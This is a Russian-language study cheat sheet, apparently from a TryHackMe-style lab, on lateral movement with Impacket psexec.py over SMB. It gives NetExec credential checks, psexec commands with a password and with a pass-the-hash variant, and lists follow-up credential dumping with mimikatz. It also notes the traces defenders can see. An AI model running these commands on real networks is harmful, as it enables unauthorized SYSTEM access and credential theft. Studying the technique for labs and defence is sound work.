# PSEXEC — УДАЛЕННОЕ ВЫПОЛНЕНИЕ ЧЕРЕЗ SMB

## Что это

PsExec — одна из самых известных техник lateral movement.
Impacket `psexec.py` — Python реализация, которая:
- Подключается к цели по SMB (порт 445)
- Загружает служебный бинарник
- Создает и запускает Windows службу
- Возвращает интерактивный shell

## Важный нюанс

Shell приходит как **NT AUTHORITY\SYSTEM** (не как пользователь, которым аутентифицировались) из-за того, что служба создается из под system аккаунта windows.


# КАК РАБОТАЕТ PSEXEC (ПОД КАПОТОМ)

1. Аутентификация по SMB (порт 445), открытие IPC$ share
2. Подключение к ADMIN$ (C:\Windows\), загрузка случайно названного .exe
3. Открытие Service Control Manager (SCM) через \PIPE\svcctl
4. Вызов `CreateServiceW` — создает службу (генерирует Event ID 7045)
5. Вызов `StartServiceW` — запускает службу (бинарник выполняется как LocalSystem)
6. При выходе — служба останавливается, удаляется, бинарник стирается

## Почему PsExec считается "шумным"

- Пишет файл на диск (в ADMIN$)
- Создает службу
- Генерирует Event ID 7045 (System log)
- Все это оставляет следы для защитников

# ТРЕБОВАНИЯ ДЛЯ PSEXEC

- Учетная запись должна иметь **Local Administrator** права на целевой машине
- Доступность SMB (порт 445)
- SMB signing не должен быть обязательным


# ПРАКТИКА: ПРОВЕРКА ДОСТУПА

## NetExec (nxc) для проверки

nxc smb TARGET_IP -u username -p password -d DOMAIN

**Ключевой индикатор:** `(Pwn3d!)` в выводе — подтверждает Local Admin доступ.

Пример вывода:
SMB 192.168.13.61 445 WRK1 [+] thm.loc\jdoe:Summer2026! (Pwn3d!)


# ПРАКТИКА: ЗАПУСК PSEXEC

## Команда

psexec.py DOMAIN/username:'password'@TARGET_IP

## Пример

psexec.py thm.loc/jdoe:'Summer2026!'@192.168.13.61

## После подключения

C:\Windows\system32> whoami
nt authority\system

---

# ЧТО МОЖНО СДЕЛАТЬ С SYSTEM SHELL

- Читать файлы, к которым у обычного пользователя нет доступа для поиска других кредов
- Дамп LSASS (mimikatz)
- Извлечь кэшированные креды (lsadump::cache)
- Продолжить lateral movement дальше

# ТИПИЧНЫЕ ПРОБЛЕМЫ И РЕШЕНИЯ

| Проблема | Причина |
|----------|---------|
| PsExec виснет или не подключается | ADMIN$ недоступен (445 блокируется) |
| Нет (Pwn3d!) в nxc | Учетка не имеет Local Admin прав |
| Ошибка аутентификации | SMB signing принудительно включен |

Всегда сначала проверяй доступ через `nxc`, потом запускай `psexec.py`.

# БЫСТРАЯ ШПАРГАЛКА

# Проверить доступ (Local Admin?)
nxc smb TARGET_IP -u user -p pass -d DOMAIN

# Получить SYSTEM shell
psexec.py DOMAIN/user:'pass'@TARGET_IP

# Pass-the-Hash версия
psexec.py DOMAIN/user@TARGET_IP -hashes :NTLM_HASH

# Выйти из shell
exit